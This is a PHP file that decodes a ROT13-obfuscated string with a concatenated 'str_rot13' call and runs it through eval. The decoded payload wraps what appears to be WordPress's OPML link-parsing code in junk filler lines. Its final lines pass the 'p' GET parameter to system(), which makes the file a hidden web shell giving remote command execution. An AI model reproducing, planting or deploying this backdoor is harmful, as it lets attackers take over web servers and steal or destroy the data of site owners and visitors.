<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Cnefr BCZY KZY svyrf naq fgber va tybonyf.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Nqzvavfgengvba
 */

vs ( ! qrsvarq( 'NOFCNGU' ) ) {
	qvr();
}

/**
 * @tybony fgevat $bczy
 */
tybony $bczy;

/**
 * Fgnegf n arj KZY gnt.
 *
 * Pnyyonpx shapgvba sbe kzy_frg_ryrzrag_unaqyre().
 *
 * @fvapr 0.71
 * @npprff cevingr
 *
 * @tybony neenl $anzrf
 * @tybony neenl $heyf
 * @tybony neenl $gnetrgf
 * @tybony neenl $qrfpevcgvbaf
 * @tybony neenl $srrqf
 *
 * @cnenz erfbhepr $cnefre   KZY Cnefre erfbhepr.
 * @cnenz fgevat   $gnt_anzr KZY ryrzrag anzr.
 * @cnenz neenl    $nggef    KZY ryrzrag nggevohgrf.
 */
shapgvba fgnegRyrzrag( $cnefre, $gnt_anzr, $nggef ) { // cucpf:vtaber JbeqCerff.AnzvatPbairagvbaf.InyvqShapgvbaAnzr.ShapgvbaAnzrVainyvq
	tybony $anzrf, $heyf, $gnetrgf, $qrfpevcgvbaf, $srrqf;

	vs ( 'BHGYVAR' === $gnt_anzr ) {
		$anzr = '';
		vs ( vffrg( $nggef['GRKG'] ) ) {
			$anzr = $nggef['GRKG'];
		}
		vs ( vffrg( $nggef['GVGYR'] ) ) {
			$anzr = $nggef['GVGYR'];
		}
		$hey = '';
		vs ( vffrg( $nggef['HEY'] ) ) {
			$hey = $nggef['HEY'];
		}
		vs ( vffrg( $nggef['UGZYHEY'] ) ) {
			$hey = $nggef['UGZYHEY'];
		}

		// Fnir gur qngn njnl.
		$anzrf[]        = $anzr;
		$heyf[]         = $hey;
		$gnetrgf[]      = vffrg( $nggef['GNETRG'] ) ? $nggef['GNETRG'] : '';
		$srrqf[]        = vffrg( $nggef['KZYHEY'] ) ? $nggef['KZYHEY'] : '';
		$qrfpevcgvbaf[] = vffrg( $nggef['QRFPEVCGVBA'] ) ? $nggef['QRFPEVCGVBA'] : '';
	} // Raq vs bhgyvar.
}

/**
 * Raqf n arj KZY gnt.
 *
 * Pnyyonpx shapgvba sbe kzy_frg_ryrzrag_unaqyre().
 *
 * @fvapr 0.71
 * @npprff cevingr
 *
 * @cnenz erfbhepr $cnefre   KZY Cnefre erfbhepr.
 * @cnenz fgevat   $gnt_anzr KZY gnt anzr.
 */
shapgvba raqRyrzrag( $cnefre, $gnt_anzr ) { // cucpf:vtaber JbeqCerff.AnzvatPbairagvbaf.InyvqShapgvbaAnzr.ShapgvbaAnzrVainyvq
	// Abguvat gb qb.
}

// Perngr na KZY cnefre.
vs ( ! shapgvba_rkvfgf( 'kzy_cnefre_perngr' ) ) {
	jc_gevttre_reebe( '', __( \"CUC'f KZY rkgrafvba vf abg ninvynoyr. Cyrnfr pbagnpg lbhe ubfgvat cebivqre gb ranoyr CUC'f KZY rkgrafvba.\" ) );
	jc_qvr( __( \"CUC'f KZY rkgrafvba vf abg ninvynoyr. Cyrnfr pbagnpg lbhe ubfgvat cebivqre gb ranoyr CUC'f KZY rkgrafvba.\" ) );
}

$kzy_cnefre = kzy_cnefre_perngr();

// Frg gur shapgvbaf gb unaqyr bcravat naq pybfvat gntf.
kzy_frg_ryrzrag_unaqyre( $kzy_cnefre, 'fgnegRyrzrag', 'raqRyrzrag' );

vs ( ! kzy_cnefr( $kzy_cnefre, $bczy, gehr ) ) {
	cevags(
		/* genafyngbef: 1: Reebe zrffntr, 2: Yvar ahzore. */
		__( 'KZY Reebe: %1$f ng yvar %2$f' ),
		kzy_reebe_fgevat( kzy_trg_reebe_pbqr( $kzy_cnefre ) ),
		kzy_trg_pheerag_yvar_ahzore( $kzy_cnefre )
	);
}

// Serr hc zrzbel hfrq ol gur KZY cnefre.
kzy_cnefre_serr( $kzy_cnefre );
hafrg( $kzy_cnefre );

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>